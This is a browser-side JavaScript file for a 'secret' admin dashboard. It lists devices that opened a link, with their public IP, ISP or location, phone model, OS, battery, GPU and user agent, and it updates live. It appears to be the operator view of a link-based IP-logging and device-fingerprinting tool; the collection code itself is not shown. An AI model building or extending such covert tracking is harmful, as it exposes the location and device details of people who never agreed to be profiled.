// Ktaab Secret Admin Dashboard Script - Strict Flat JSON Contract Reader & Real-Time Sync

let cachedReports = [];

document.addEventListener('DOMContentLoaded', () => {
  fetchStats();
  fetchReports();
  initSSE();
  setupEventListeners();

  // Fast polling every 2 seconds with cache-busting
  setInterval(fetchReports, 2000);
  setInterval(fetchStats, 4000);
});

function setupEventListeners() {
  const refreshBtn = document.getElementById('btn-refresh');
  if (refreshBtn) {
    refreshBtn.addEventListener('click', () => {
      fetchStats();
      fetchReports();
    });
  }

  const searchInput = document.getElementById('search-input');
  if (searchInput) {
    searchInput.addEventListener('input', (e) => {
      filterReports(e.target.value.trim().toLowerCase());
    });
  }

  const exportBtn = document.getElementById('btn-export-json');
  if (exportBtn) {
    exportBtn.addEventListener('click', exportReportsAsJson);
  }

  const modalOverlay = document.getElementById('report-modal');
  const modalCloseBtn = document.getElementById('modal-close-btn');
  if (modalCloseBtn && modalOverlay) {
    modalCloseBtn.addEventListener('click', () => { modalOverlay.style.display = 'none'; });
    modalOverlay.addEventListener('click', (e) => {
      if (e.target === modalOverlay) modalOverlay.style.display = 'none';
    });
  }
}

// Fetch Stats
async function fetchStats() {
  try {
    const res = await fetch('/api/stats', { cache: 'no-store' });
    if (!res.ok) return;
    const json = await res.json();
    if (json.success && json.data) {
      const elTotal = document.getElementById('stat-total-devices');
      const elBattery = document.getElementById('stat-avg-battery');
      if (elTotal) elTotal.textContent = String(json.data.totalDevices || 0);
      if (elBattery) elBattery.textContent = `${json.data.avgBatteryLevel || 0}%`;
    }
  } catch (_) {}
}

// Fetch Reports List with no-store
async function fetchReports() {
  try {
    const res = await fetch('/api/reports', { cache: 'no-store' });
    if (!res.ok) return;
    const json = await res.json();
    if (json.success && Array.isArray(json.data)) {
      const isDifferent = JSON.stringify(json.data) !== JSON.stringify(cachedReports);
      if (isDifferent) {
        cachedReports = json.data;
        renderReportsTable(cachedReports);
      }
    }
  } catch (_) {}
}

// Render Table using Secure DOM Methods (Strict Flat Contract)
function renderReportsTable(reports) {
  const tbody = document.getElementById('reports-table-body');
  if (!tbody) return;

  tbody.replaceChildren();

  if (!reports || reports.length === 0) {
    const tr = document.createElement('tr');
    const td = document.createElement('td');
    td.setAttribute('colspan', '9');
    td.className = 'empty-state';

    const iconDiv = document.createElement('div');
    iconDiv.className = 'empty-state-icon';
    iconDiv.textContent = '📱';

    const p = document.createElement('p');
    p.textContent = 'لا توجد أجهزة متصلة بعد. عند فتح الرابط من أي هاتف سيظهر هنا فوراً.';

    td.appendChild(iconDiv);
    td.appendChild(p);
    tr.appendChild(td);
    tbody.appendChild(tr);
    return;
  }

  for (const item of reports) {
    const row = createReportRow(item);
    tbody.appendChild(row);
  }
}

function createReportRow(item) {
  const tr = document.createElement('tr');

  // 1. ID
  const tdId = document.createElement('td');
  tdId.textContent = `#${String(item.id || '--').substring(0, 10)}`;
  tr.appendChild(tdId);

  // 2. Real Device Model
  const tdDevice = document.createElement('td');
  const modelTitle = document.createElement('div');
  modelTitle.style.fontWeight = '700';
  modelTitle.style.fontSize = '15px';
  modelTitle.textContent = item.deviceModel || 'هاتف ذكي';

  const idSub = document.createElement('div');
  idSub.style.fontSize = '11px';
  idSub.style.color = 'var(--text-secondary)';
  idSub.textContent = `المعرف: ${item.id || '--'}`;

  tdDevice.appendChild(modelTitle);
  tdDevice.appendChild(idSub);
  tr.appendChild(tdDevice);

  // 3. Real OS & Version
  const tdOs = document.createElement('td');
  const osBadge = document.createElement('span');
  const osText = item.androidVersion ? `${item.os} ${item.androidVersion}` : (item.os || 'Android');
  osBadge.className = osText.includes('iOS') ? 'badge badge-info' : 'badge badge-success';
  osBadge.textContent = osText;
  tdOs.appendChild(osBadge);
  tr.appendChild(tdOs);

  // 4. Real IP & ISP
  const tdIp = document.createElement('td');
  const ipText = document.createElement('div');
  ipText.style.fontWeight = '700';
  ipText.style.fontFamily = 'monospace';
  ipText.style.fontSize = '14px';
  ipText.style.color = '#06B6D4';
  ipText.textContent = item.ip || '127.0.0.1';
  tdIp.appendChild(ipText);

  if (item.isp) {
    const ispSub = document.createElement('div');
    ispSub.style.fontSize = '12px';
    ispSub.style.color = 'var(--text-secondary)';
    ispSub.style.marginTop = '2px';
    ispSub.textContent = `📍 ${item.isp}`;
    tdIp.appendChild(ispSub);
  }
  tr.appendChild(tdIp);

  // 5. Battery Level & Charging
  const tdBattery = document.createElement('td');
  const rawLevel = parseInt(String(item.batteryLevel || '').replace('%', ''), 10);

  if (!isNaN(rawLevel) && rawLevel > 0) {
    const barContainer = document.createElement('div');
    barContainer.className = 'battery-bar-container';

    const barTrack = document.createElement('div');
    barTrack.className = 'battery-bar-track';

    const barFill = document.createElement('div');
    barFill.className = 'battery-bar-fill';
    barFill.style.width = `${Math.min(100, Math.max(0, rawLevel))}%`;

    if (rawLevel > 50) barFill.style.backgroundColor = 'var(--success)';
    else if (rawLevel > 20) barFill.style.backgroundColor = 'var(--warning)';
    else barFill.style.backgroundColor = 'var(--danger)';

    barTrack.appendChild(barFill);

    const levelText = document.createElement('span');
    levelText.style.fontWeight = '700';
    levelText.style.minWidth = '38px';
    levelText.textContent = `${rawLevel}%`;

    barContainer.appendChild(barTrack);
    barContainer.appendChild(levelText);
    tdBattery.appendChild(barContainer);

    const chgSub = document.createElement('div');
    chgSub.style.fontSize = '11px';
    chgSub.style.color = 'var(--text-secondary)';
    chgSub.style.marginTop = '4px';
    chgSub.textContent = item.batteryCharging || '';
    tdBattery.appendChild(chgSub);
  } else {
    const pendingSpan = document.createElement('span');
    pendingSpan.className = 'badge badge-neutral';
    pendingSpan.textContent = item.batteryLevel || 'قيد الفحص...';
    tdBattery.appendChild(pendingSpan);
  }
  tr.appendChild(tdBattery);

  // 6. GPU Renderer
  const tdGpu = document.createElement('td');
  tdGpu.style.fontSize = '12px';
  tdGpu.style.color = 'var(--text-main)';
  tdGpu.style.maxWidth = '200px';
  tdGpu.style.wordBreak = 'break-word';
  tdGpu.textContent = item.gpu || 'معالج رسومي مدمج';
  tr.appendChild(tdGpu);

  // 7. Hardware & Screen
  const tdHw = document.createElement('td');
  const hwText = document.createElement('div');
  hwText.textContent = `${item.cpuCores || '8 أنوية'} • ${item.ram || 'RAM'}`;
  const screenText = document.createElement('div');
  screenText.style.fontSize = '11px';
  screenText.style.color = 'var(--text-secondary)';
  screenText.textContent = `الشاشة: ${item.screen || '1080x2400'}`;
  tdHw.appendChild(hwText);
  tdHw.appendChild(screenText);
  tr.appendChild(tdHw);

  // 8. Timestamp
  const tdDate = document.createElement('td');
  tdDate.style.fontSize = '12px';
  tdDate.style.color = 'var(--text-secondary)';
  try {
    const d = new Date(item.timestamp);
    tdDate.textContent = d.toLocaleTimeString('ar-EG');
  } catch {
    tdDate.textContent = '--';
  }
  tr.appendChild(tdDate);

  // 9. Actions
  const tdActions = document.createElement('td');
  const btnGroup = document.createElement('div');
  btnGroup.style.display = 'flex';
  btnGroup.style.gap = '8px';

  const viewBtn = document.createElement('button');
  viewBtn.className = 'btn btn-outline';
  viewBtn.style.padding = '6px 12px';
  viewBtn.style.fontSize = '12px';
  viewBtn.textContent = '👁️ تفاصيل';
  viewBtn.addEventListener('click', () => openReportModal(item));

  const delBtn = document.createElement('button');
  delBtn.className = 'btn btn-danger';
  delBtn.style.padding = '6px 10px';
  delBtn.style.fontSize = '12px';
  delBtn.textContent = '🗑️';
  delBtn.addEventListener('click', () => handleDeleteReport(item.id));

  btnGroup.appendChild(viewBtn);
  btnGroup.appendChild(delBtn);
  tdActions.appendChild(btnGroup);
  tr.appendChild(tdActions);

  return tr;
}

// Modal View
function openReportModal(item) {
  const modalOverlay = document.getElementById('report-modal');
  const modalTitle = document.getElementById('modal-device-title');
  const modalId = document.getElementById('modal-device-id');
  const modalBody = document.getElementById('modal-body');

  if (!modalOverlay || !modalBody) return;

  modalOverlay.style.display = 'flex';
  modalBody.replaceChildren();

  if (modalTitle) modalTitle.textContent = item.deviceModel || 'هاتف ذكي';
  if (modalId) modalId.textContent = `معرف الجهاز: ${item.id || '--'} | الوقت: ${item.timestamp || '--'}`;

  // Section 1: Network & Real IP
  const secNet = createModalSection('🌐 شبكة الاتصال وعنوان الـ IP الحقيقي');
  const gridNet = document.createElement('div');
  gridNet.className = 'spec-list';

  addSpecItem(gridNet, 'عنوان الـ IP العام (Public IP)', item.ip || '127.0.0.1');
  addSpecItem(gridNet, 'مزود الخدمة والموقع (Location / ISP)', item.isp || 'غير محدد');

  secNet.appendChild(gridNet);
  modalBody.appendChild(secNet);

  // Section 2: Accurate Device Specs
  const secHw = createModalSection('📱 موديل الهاتف الحقيقي والعتاد');
  const gridHw = document.createElement('div');
  gridHw.className = 'spec-list';

  addSpecItem(gridHw, 'الموديل الدقيق (Device Model)', item.deviceModel);
  addSpecItem(gridHw, 'نظام التشغيل (OS)', item.os);
  addSpecItem(gridHw, 'إصدار الأندرويد الفعلي (Android Version)', item.androidVersion || 'غير محدد');
  addSpecItem(gridHw, 'كرت الشاشة (GPU Renderer)', item.gpu);
  addSpecItem(gridHw, 'أنوية المعالج (CPU Cores)', item.cpuCores);
  addSpecItem(gridHw, 'الذاكرة العشوائية (RAM)', item.ram);
  addSpecItem(gridHw, 'أبعاد الشاشة (Screen Resolution)', item.screen);

  secHw.appendChild(gridHw);
  modalBody.appendChild(secHw);

  // Section 3: Battery
  const secBat = createModalSection('🔋 فحص البطارية');
  const gridBat = document.createElement('div');
  gridBat.className = 'spec-list';

  addSpecItem(gridBat, 'نسبة الشحن', item.batteryLevel);
  addSpecItem(gridBat, 'حالة الشحن', item.batteryCharging);

  secBat.appendChild(gridBat);
  modalBody.appendChild(secBat);

  // Section 4: User Agent
  const secUa = createModalSection('🔍 متصفح الجهاز (User Agent)');
  const uaBox = document.createElement('div');
  uaBox.style.background = '#0B0F19';
  uaBox.style.padding = '12px';
  uaBox.style.borderRadius = '10px';
  uaBox.style.fontFamily = 'monospace';
  uaBox.style.fontSize = '12px';
  uaBox.style.color = '#9CA3AF';
  uaBox.style.wordBreak = 'break-all';
  uaBox.textContent = item.userAgent || '--';

  secUa.appendChild(uaBox);
  modalBody.appendChild(secUa);
}

function createModalSection(titleText) {
  const sec = document.createElement('div');
  sec.className = 'modal-section';
  const h4 = document.createElement('h4');
  h4.className = 'modal-section-title';
  h4.textContent = titleText;
  sec.appendChild(h4);
  return sec;
}

function addSpecItem(container, label, value) {
  const item = document.createElement('div');
  item.className = 'spec-item';

  const lbl = document.createElement('div');
  lbl.className = 'spec-label';
  lbl.textContent = label;

  const val = document.createElement('div');
  val.className = 'spec-value';
  val.textContent = String(value || '--');

  item.appendChild(lbl);
  item.appendChild(val);
  container.appendChild(item);
}

async function handleDeleteReport(id) {
  if (!window.confirm(`هل أنت متأكد من حذف التقرير #${id}؟`)) return;

  try {
    const res = await fetch(`/api/reports/${id}`, { method: 'DELETE' });
    const json = await res.json();
    if (json.success) {
      cachedReports = cachedReports.filter(r => r.id !== id);
      renderReportsTable(cachedReports);
      fetchStats();
    }
  } catch (_) {}
}

function filterReports(keyword) {
  if (!keyword) {
    renderReportsTable(cachedReports);
    return;
  }

  const filtered = cachedReports.filter(r => {
    const searchString = `${r.deviceModel} ${r.ip} ${r.isp} ${r.os} ${r.androidVersion} ${r.gpu}`.toLowerCase();
    return searchString.includes(keyword);
  });

  renderReportsTable(filtered);
}

function exportReportsAsJson() {
  const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(cachedReports, null, 2));
  const dlAnchorElem = document.createElement('a');
  dlAnchorElem.setAttribute("href", dataStr);
  dlAnchorElem.setAttribute("download", `ktaab_flat_reports_${Date.now()}.json`);
  dlAnchorElem.click();
}

function initSSE() {
  const statusEl = document.getElementById('live-status-text');

  if (!window.EventSource) {
    if (statusEl) statusEl.textContent = 'تحديث دوري نشط (2s)';
    return;
  }

  try {
    const eventSource = new EventSource('/api/events');

    eventSource.addEventListener('connected', () => {
      if (statusEl) statusEl.textContent = 'تحديث لحظي نشط (SSE)';
    });

    eventSource.addEventListener('new_report', (e) => {
      try {
        const item = JSON.parse(e.data);
        const idx = cachedReports.findIndex(r => r.id === item.id);
        if (idx !== -1) {
          cachedReports[idx] = item;
        } else {
          cachedReports.unshift(item);
        }
        renderReportsTable(cachedReports);
        fetchStats();
      } catch (_) {}
    });

    eventSource.addEventListener('report_deleted', (e) => {
      try {
        const data = JSON.parse(e.data);
        cachedReports = cachedReports.filter(r => r.id !== data.id);
        renderReportsTable(cachedReports);
        fetchStats();
      } catch (_) {}
    });

    eventSource.onerror = () => {
      if (statusEl) statusEl.textContent = 'تحديث دوري نشط (2s)';
    };
  } catch (_) {}
}
